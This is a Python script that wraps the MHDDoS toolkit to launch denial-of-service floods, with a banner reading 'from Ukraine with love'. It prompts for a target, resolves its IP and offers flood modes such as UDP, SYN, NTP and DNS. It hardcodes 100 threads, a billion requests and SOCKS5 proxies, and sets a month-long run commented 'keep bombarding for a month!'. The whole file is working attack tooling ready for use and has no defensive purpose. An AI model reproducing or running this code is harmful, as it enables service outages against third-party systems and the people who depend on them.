import sys
from sys import argv

import colorama
from humanfriendly.terminal import ansi_wrap

from MHDDoS.start import start, ToolsConsole
from utils import print_vpn_warning, supports_complex_colors, is_valid_ipv4


def print_flair():
    BLUE = (0, 91, 187) if supports_complex_colors() else "blue"
    YELLOW = (255, 213, 0) if supports_complex_colors() else "yellow"
    GREEN = (8, 255, 8) if supports_complex_colors() else "green"
    RED = (255, 0, 0) if supports_complex_colors() else "red"

    heart = ansi_wrap("♥", color=RED)
    flair_string = "\n" + \
                   "A light freedom-infused MHDDoS wrapper...\n" + \
                   "\n" + \
                   ansi_wrap("██████╗░██╗░░░██╗██████╗░██╗███████╗██╗░░██╗░█████╗░██╗░░██╗\n", color=BLUE) + \
                   ansi_wrap("██╔══██╗╚██╗░██╔╝██╔══██╗██║╚════██║██║░░██║██╔══██╗██║░██╔╝\n", color=BLUE) + \
                   ansi_wrap("██████╔╝░╚████╔╝░██████╔╝██║░░███╔═╝███████║██║░░██║█████═╝░\n", color=BLUE) + \
                   ansi_wrap("██╔═══╝░░░╚██╔╝░░██╔══██╗██║██╔══╝░░██╔══██║██║░░██║██╔═██╗░\n", color=YELLOW) + \
                   ansi_wrap("██║░░░░░░░░██║░░░██║░░██║██║███████╗██║░░██║╚█████╔╝██║░╚██╗\n", color=YELLOW) + \
                   ansi_wrap("╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝\n", color=YELLOW) + \
                   "\n" + \
                   f"                                 ...from Ukraine with love {heart}\n"
    print(flair_string)
    print(ansi_wrap("Initializing...\n", color=GREEN))


def kara():
    print_flair()
    print_vpn_warning()

    # Init variables
    address = None
    port = None
    protocol = None

    # override script name
    argv[0] = "pyrizhok.py"

    # Parse target address
    if len(argv) < 2:
        address = input("Enter target address: ")
        if not address:
            print("Target not specified, aborting execution.")
            sys.exit(1)
        argv.insert(1, address)
    address = argv[1]

    # Parse port
    default_protocol = "UDP"
    if len(argv) > 2:
        port = argv[2]

        try:
            port = int(port)
        except ValueError:
            print(f"Invalid port provided ({port}). Port must be an integer value in range [1..65535]. Aborting execution.")
            sys.exit(1)

        print(f"Port provided ({port}). Using {default_protocol} mode...")

        # If we have the port, bot no IP address, we need to get the IP of the target
        if not is_valid_ipv4(address):
            dns_info = ToolsConsole.info(address)
            if not dns_info["success"]:
                print(f"Port provided, but IP address of '{address}' could not be found. Cannot proceed.")
                sys.exit(1)

            address = dns_info['ip']

    # Parse protocol
    protocol = default_protocol
    if len(argv) > 3:
        protocol = argv[3]
        available_protocols = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP", "MINECRAFT", "DNS", "CHAR", "ARD", "RDP"]
        if protocol in available_protocols:
            print(f"Overriding attack protocol to '{protocol}'.")
        else:
            protocol = default_protocol
            print(f"Invalid attack protocol provided: {protocol}. Will use the protocol selected by default ({default_protocol}').\n"
                  f"If you want to override it, restart with one of the valid options: {','.join(available_protocols)}\n")

    hardcoded_n_threads = 100
    hardcoded_n_requests = 1000000000

    if not port or port == 80 or port == 443:
        # Prepare URL attack arguments
        argv[1] = "GET"
        argv.insert(2, address)
        argv.insert(3, "5")
        argv.insert(4, f"{hardcoded_n_threads}")
        argv.insert(5, "socks5.txt")
        argv.insert(6, f"{hardcoded_n_requests}")
        argv.insert(7, "44640")  # keep bombarding for a month!

        # Remove excess arguments
        while len(argv) > 8:
            argv.pop(-1)
    else:
        # Prepare IP attack arguments
        argv[1] = f"{protocol if protocol else default_protocol}"
        argv.insert(2, f"{address}:{port}")
        argv.insert(3, f"{hardcoded_n_threads}")
        argv.insert(4, "44640")  # keep bombarding for a month!

        # Remove excess arguments
        while len(argv) > 5:
            argv.pop(-1)

    # enable debug to see attack progress
    argv.append("true")

    print()
    print(f"Initiating attack with the following MHDDoS parameters:\n     {' '.join(argv[1:])}")
    print()

    start()


if __name__ == '__main__':
    colorama.init()

    try:
        kara()
    except KeyboardInterrupt:
        print("\nExecution aborted.\n")
    except SystemExit as e:
        print(ansi_wrap(f"Caught SystemExit Exception: {e}", color=(255, 0, 0)))

    colorama.deinit()

    input("\nExecution finished.\nPress ENTER to exit... ")
